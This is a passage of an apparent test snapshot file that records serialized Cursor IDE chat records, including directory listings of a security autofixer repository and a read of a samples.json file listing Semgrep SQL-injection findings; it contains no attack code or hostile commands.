on\\",\\"fullSubtreeExtensionCounts\\":{\\".jinja2\\":1,\\".py\\":76,\\".json\\":1,\\".graphql\\":1},\\"numFiles\\":79},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/scripts\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".ambr\\":1,\\".py\\":60,\\".json\\":19,\\".java\\":11,\\".xml\\":14,\\".fpr\\":3,\\".js\\":1,\\".yaml\\":1,\\".jsp\\":1},\\"numFiles\\":111}],\\"childrenFiles\\":[{\\"name\\":\\"autoflake.cfg\\"},{\\"name\\":\\"coverage.xml\\"},{\\"name\\":\\"hasura_schema.json\\"},{\\"name\\":\\"junit-result.xml\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"poetry.lock\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"ptw.ini\\"},{\\"name\\":\\"pyproject.toml\\"},{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":1,\\".lock\\":1,\\".py\\":137,\\".ini\\":1,\\".md\\":1,\\".ambr\\":1,\\".json\\":20,\\".java\\":11,\\".xml\\":14,\\".fpr\\":3,\\".js\\":1,\\".yaml\\":1,\\".jsp\\":1,\\".toml\\":1,\\".jinja2\\":1,\\".graphql\\":1,\\"\\":1,\\".cfg\\":1},\\"numFiles\\":198},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts/allowed-queries-generator\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":13,\\".json\\":2,\\".yaml\\":1,\\".js\\":6,\\".py\\":1},\\"numFiles\\":23},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts/analyzer\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":1},\\"numFiles\\":1}],\\"childrenFiles\\":[{\\"name\\":\\"add_issue.sh\\"},{\\"name\\":\\"add_org.sh\\"},{\\"name\\":\\"add_project.sh\\"},{\\"name\\":\\"add_user_to_project.sh\\"},{\\"name\\":\\"add_user.sh\\"},{\\"name\\":\\"check_all_services_online.py\\"},{\\"name\\":\\"check_cli_version.sh\\"},{\\"name\\":\\"cleanup_ecr.sh\\"},{\\"name\\":\\"create_api_token.sh\\"},{\\"name\\":\\"CreateToken.gql\\"},{\\"name\\":\\"deploy_broker_client.sh\\"},{\\"name\\":\\"deploy_env.sh\\"},{\\"name\\":\\"dotenv_vault_login.sh\\"},{\\"name\\":\\"download_fix_data.sh\\"},{\\"name\\":\\"extract_highlight_nodes_source.sh\\"},{\\"name\\":\\"extract_repo.sh\\"},{\\"name\\":\\"filter_ignorefiles.py\\"},{\\"name\\":\\"fix_python_codestyle.sh\\"},{\\"name\\":\\"fix_typescript_codestyle.sh\\"},{\\"name\\":\\"generate_gql_code.sh\\"},{\\"name\\":\\"generate_report.sh\\"},{\\"name\\":\\"highlight_nodes.sh\\"},{\\"name\\":\\"init.sh\\"},{\\"name\\":\\"InitOrganizationAndProject.gql\\"},{\\"name\\":\\"install_global_reqs.sh\\"},{\\"name\\":\\"install_shell_profile.sh\\"},{\\"name\\":\\"login_auth0.sh\\"},{\\"name\\":\\"opengrep_init.sh\\"},{\\"name\\":\\"optimize-vulnerability-report.sh\\"},{\\"name\\":\\"pm2_restarts.sh\\"},{\\"name\\":\\"publish_cli.sh\\"},{\\"name\\":\\"pull_env.sh\\"},{\\"name\\":\\"push_env.sh\\"},{\\"name\\":\\"python_update_lock_files.sh\\"},{\\"name\\":\\"remove_prefix.py\\"},{\\"name\\":\\"restart_failed_pr_workflows.sh\\"},{\\"name\\":\\"smart_build.sh\\"},{\\"name\\":\\"start.sh\\"},{\\"name\\":\\"test_mobb_github_action.sh\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":35,\\".py\\":4,\\".ts\\":13,\\".json\\":2,\\".yaml\\":1,\\".js\\":6,\\".gql\\":2},\\"numFiles\\":63},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/app\\",\\"fullSubtreeExtensionCounts\\":{\\".tsx\\":402,\\".ts\\":256,\\".graphql\\":7,\\".json\\":4,\\".md\\":5,\\".png\\":15,\\".gif\\":4,\\".svg\\":19,\\".js\\":2,\\".css\\":2,\\".snap\\":1,\\".env\\":1,\\"\\":1,\\".html\\":1,\\".sh\\":1},\\"numFiles\\":721},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/app_api\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":3,\\".yaml\\":127,\\".graphql\\":1,\\".md\\":1,\\"\\":1,\\".sql\\":1135},\\"numFiles\\":1268},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/broker\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":6,\\".toml\\":1,\\".js\\":2,\\".json\\":4,\\".graphql\\":1,\\".sh\\":2,\\"\\":2,\\".key\\":1,\\".md\\":1,\\".template\\":1,\\".crt\\":1},\\"numFiles\\":22},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/datadog_postgres_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":2,\\"\\":1},\\"numFiles\\":3},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/interactive_fixer\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":3,\\".lock\\":1,\\".ini\\":1,\\".py\\":16,\\".md\\":1,\\".toml\\":1,\\"\\":2,\\".cfg\\":1},\\"numFiles\\":26},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/node_general_backend\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":99,\\".json\\":26,\\".fpr\\":4,\\".zip\\":4,\\".graphql\\":2,\\".sh\\":1,\\".js\\":2,\\".xml\\":1,\\".java\\":2,\\".diff\\":1,\\"\\":1,\\".txt\\":1},\\"numFiles\\":144},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/rabbitmq\\",\\"fullSubtreeExtensionCounts\\":{\\"\\":2,\\".conf\\":1},\\"numFiles\\":3}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":10,\\".lock\\":1,\\".ini\\":1,\\".py\\":16,\\".md\\":8,\\".toml\\":2,\\"\\":10,\\".cfg\\":1,\\".ts\\":361,\\".json\\":34,\\".fpr\\":4,\\".zip\\":4,\\".graphql\\":11,\\".js\\":6,\\".xml\\":1,\\".java\\":2,\\".diff\\":1,\\".txt\\":1,\\".yaml\\":129,\\".conf\\":1,\\".tsx\\":402,\\".png\\":15,\\".gif\\":4,\\".svg\\":19,\\".css\\":2,\\".snap\\":1,\\".env\\":1,\\".html\\":1,\\".key\\":1,\\".template\\":1,\\".crt\\":1,\\".sql\\":1135},\\"numFiles\\":2187},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/backend\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":34,\\".sh\\":1,\\".json\\":2,\\".graphql\\":2},\\"numFiles\\":39},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/components\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":12,\\".json\\":2,\\".svg\\":143,\\".js\\":2,\\".sh\\":1,\\".tsx\\":187},\\"numFiles\\":347},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/eslint-config-custom\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":1,\\".js\\":1},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/frontend\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1,\\".sh\\":1,\\".json\\":2},\\"numFiles\\":4},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/pulumi\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":5,\\".json\\":2},\\"numFiles\\":7},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/shared\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":14,\\".sh\\":1,\\".json\\":3},\\"numFiles\\":18},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon/tsconfig\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":4},\\"numFiles\\":4}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":66,\\".json\\":16,\\".js\\":3,\\".svg\\":143,\\".sh\\":4,\\".tsx\\":187,\\".graphql\\":2},\\"numFiles\\":421}],\\"childrenFiles\\":[{\\"name\\":\\"CLAUDE.md\\"},{\\"name\\":\\"cspell.json\\"},{\\"name\\":\\"docker-bake-gha-cache.hcl\\"},{\\"name\\":\\"docker-compose.yml\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"mypy_ext.ini\\"},{\\"name\\":\\"mypy.ini\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"pnpm-lock.yaml\\"},{\\"name\\":\\"pnpm-workspace.yaml\\"},{\\"name\\":\\"pom.xml\\"},{\\"name\\":\\"readme.md\\"},{\\"name\\":\\"static-analysis.datadog.yml\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":174,\\".ts\\":1268,\\".json\\":1928,\\".js\\":163,\\".svg\\":163,\\".hcl\\":1,\\"\\":1852,\\".sql\\":1183,\\".sh\\":77,\\".xml\\":347,\\".lock\\":6,\\".py\\":1477,\\".ini\\":6,\\".md\\":182,\\".ambr\\":5,\\".java\\":447,\\".gql\\":2,\\".fpr\\":190,\\".zip\\":26,\\".html\\":47,\\".tsx\\":702,\\".mjs\\":16,\\".graphql\\":47,\\".csproj\\":84,\\".jinja2\\":304,\\".env\\":2,\\".png\\":145,\\".yml\\":80,\\".lisp\\":167,\\".go\\":35,\\".mod\\":13,\\".jsp\\":9,\\".toml\\":7,\\".cfg\\":6,\\".gitignore\\":1,\\".diff\\":12,\\".txt\\":26,\\".conf\\":4,\\".snap\\":2,\\".gif\\":4,\\".css\\":11,\\".key\\":1,\\".template\\":1,\\".crt\\":1,\\".cs\\":241,\\".ico\\":1,\\".http\\":1,\\".inference\\":3,\\".cshtml\\":36,\\".xsd\\":3,\\".php\\":6,\\".properties\\":13,\\".xhtml\\":2,\\".sln\\":3,\\".config\\":5,\\".aspx\\":4,\\".user\\":1,\\".c\\":4,\\".cpp\\":1,\\".ejs\\":1,\\".cmd\\":1,\\".sum\\":2,\\".sqlite3\\":1},\\"numFiles\\":11553}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-36 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:9e6f44f2-4782-4373-9887-bb890a26214e",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"9e6f44f2-4782-4373-9887-bb890a26214e","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:52.224Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"4e357db2-b1cd-4efb-a0fb-150368d6e524","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623","capabilityType":30,"thinking":{"text":"","signature":"Fx6azFBvN2d9Bg3Q5gXIdEmL_B_RUjT89QKEyjEtjiGGsGoDjIidOYFzV13VRTVXyRUAfIGhi8oDb0dCVxNPRZJ8HsO-BXtY3EYoRTDV33IK9syVuhkh2ALY8AJEVP3UgzPmTxAQwxt7sZAk_i79lnoj40zubQSC4g0O6clKMD12ye48egb7w9ADmaeHZAvHbfJGVzYaK_WafRlHjtW6ESuTPXKH_jp9sXhU4FPtAEzcc-ZyqV1emuR8miMDIbZmdsgEztqO_pKIcVTmTOieX8NAtnx0m6cWzrXYe9fbfp3YKWT2UjRLUtLkZyYeHNulTSC36max334YWDhJ6nrc8bRjicNQGfT6EK7Uieq4eXSGFTEbinpU_4WdTbh19N7e03lT6WAJUTOxnafqxvNDOWKi6krSnHEJf4rWZKz64u7_OnXsQNelbs958Y-BLOFMMNgYaYi9xPiuHTqOxIJbCH42zhVPpbQ2154"},"thinkingDurationMs":1909}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-37 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5549b140-13d6-4085-bada-7a78200fa06b",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"5549b140-13d6-4085-bada-7a78200fa06b","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:01.498Z","isQuickSearchQuery":false,"text":"Checking sample files in \`patchino/_samples\`:\\n","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-38 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:99db702c-3b9f-4c60-ba54-cd6116b88e90",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"99db702c-3b9f-4c60-ba54-cd6116b88e90","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:01.585Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":39,"toolIndex":1,"modelCallId":"7f547ef9-6c9d-4e78-be83-f640161f57f7","toolCallId":"tool_53c1e727-eb0d-43a7-bc1a-a536b44dac1","status":"completed","rawArgs":"{\\"target_directory\\": \\"/Users/jonathanafek/src/autofixer/patchino/_samples\\"}","name":"list_dir","params":"{\\"targetDirectory\\":\\"/Users/jonathanafek/src/autofixer/patchino/_samples\\"}","additionalData":{},"result":"{\\"directoryTreeRoot\\":{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/_samples\\",\\"childrenFiles\\":[{\\"name\\":\\"12e36579cafa09e786f12c4a257ca4e7.html\\"},{\\"name\\":\\"12e36579cafa09e786f12c4a257ca4e7.pkl\\"},{\\"name\\":\\"30f70896dc317958633ad1fde6d79566.html\\"},{\\"name\\":\\"30f70896dc317958633ad1fde6d79566.pkl\\"},{\\"name\\":\\"bc90c5d567713c3a4b7f2aece525894e.html\\"},{\\"name\\":\\"bc90c5d567713c3a4b7f2aece525894e.pkl\\"},{\\"name\\":\\"bdbe6ad4a26aef8ad97db6e66adad229.html\\"},{\\"name\\":\\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\"},{\\"name\\":\\"c927321cb1cce7ad39af698943333971.html\\"},{\\"name\\":\\"c927321cb1cce7ad39af698943333971.pkl\\"},{\\"name\\":\\"d1425b8d47d7597c49881ec70f4a8b75.html\\"},{\\"name\\":\\"d1425b8d47d7597c49881ec70f4a8b75.pkl\\"},{\\"name\\":\\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\"},{\\"name\\":\\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\"},{\\"name\\":\\"samples.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".html\\":7,\\".pkl\\":7,\\".json\\":1},\\"numFiles\\":15}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-39 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:8d0c07ec-9934-44ff-8996-eb4c00bf86b6",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"8d0c07ec-9934-44ff-8996-eb4c00bf86b6","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:01.585Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":40,"toolCallId":"tool_5bf3f466-a0cc-4017-ad57-1bd4e5ae161","toolIndex":2,"modelCallId":"7f547ef9-6c9d-4e78-be83-f640161f57f7","status":"completed","rawArgs":"{\\"target_file\\": \\"/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json\\"}","name":"read_file","params":"{\\"targetFile\\":\\"/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json\\",\\"charsLimit\\":100000,\\"effectiveUri\\":\\"file:///Users/jonathanafek/src/autofixer/patchino/_samples/samples.json\\"}","additionalData":{},"result":"{\\"contents\\":\\"{\\\\n    \\\\\\"created_at\\\\\\": 1745851637,\\\\n    \\\\\\"issues\\\\\\": [\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 8,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"d1425b8d47d7597c49881ec70f4a8b75\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"d1425b8d47d7597c49881ec70f4a8b75.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"d1425b8d47d7597c49881ec70f4a8b75.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/codiewio/codenire/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/codiewio/codenire/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 5,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"30f70896dc317958633ad1fde6d79566\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"30f70896dc317958633ad1fde6d79566.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"30f70896dc317958633ad1fde6d79566.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/codiewio/codenire/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/codiewio/codenire/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 32,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"c927321cb1cce7ad39af698943333971\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"c927321cb1cce7ad39af698943333971.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"c927321cb1cce7ad39af698943333971.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 31,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"c927321cb1cce7ad39af698943333971\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"c927321cb1cce7ad39af698943333971.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"c927321cb1cce7ad39af698943333971.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 27,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"d71c64f91f3745e9e6f8151d2b1f1b70\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 30,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"bdbe6ad4a26aef8ad97db6e66adad229\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"bdbe6ad4a26aef8ad97db6e66adad229.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            